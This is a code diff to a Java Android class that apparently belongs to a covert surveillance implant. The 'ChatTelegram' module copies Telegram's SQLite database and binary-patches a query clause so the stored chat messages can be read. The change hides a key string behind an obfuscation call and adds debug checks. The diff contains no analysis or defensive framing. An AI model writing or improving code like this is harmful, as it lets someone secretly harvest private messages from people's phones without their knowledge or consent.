@@ -31,6 +31,7 @@ import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.MappedByteBuffer;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
 import java.util.concurrent.Semaphore;
@@ -228,13 +229,18 @@ public class ChatTelegram extends SubModuleChat {
 		return true;
 	}
 
-	byte[] buf = new byte[1024 * 100];
-
 	private synchronized GenericSqliteHelper openCopy(String dbFile) {
-		String before = "WHERE mid < 0 AND send_state = 1";
-		String after  = "                                ";
-		byte[] b = EncodingUtils.getAsciiBytes(before);
-		byte[] a = EncodingUtils.getAsciiBytes(after);
+		byte[] buf = new byte[1024 * 10];
+
+		String matchString = M.e("WHERE mid < 0 AND send_state = 1");
+		byte[] match = EncodingUtils.getAsciiBytes(matchString);
+		byte[] replace = new byte[match.length];
+
+		Arrays.fill(replace, (byte) ' ');
+
+		if (Cfg.DEBUG) {
+			Check.asserts(matchString.length() == replace.length, " (openCopy) wrong size");
+		}
 
 		File fs = new File(dbFile);
 		dbFile = fs.getAbsolutePath();
@@ -256,8 +262,8 @@ public class ChatTelegram extends SubModuleChat {
 			boolean found = false;
 			while ((len = in.read(buf)) > 0) {
 				for(int i = 0; i< len; i++){
-					if( !found && truncatedEquals(buf, i, b )){
-						System.arraycopy(a, 0 , buf, i, a.length);
+					if( !found && truncatedEquals(buf, i, match )){
+						System.arraycopy(replace, 0 , buf, i, replace.length);
 						found = true;
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (openCopy), found binary at position: " + i);
@@ -655,8 +661,6 @@ public class ChatTelegram extends SubModuleChat {
 			return created_time;
 		}
 	}
-
-	;
 
 	public String readString(ByteBuffer in) {
 		try {
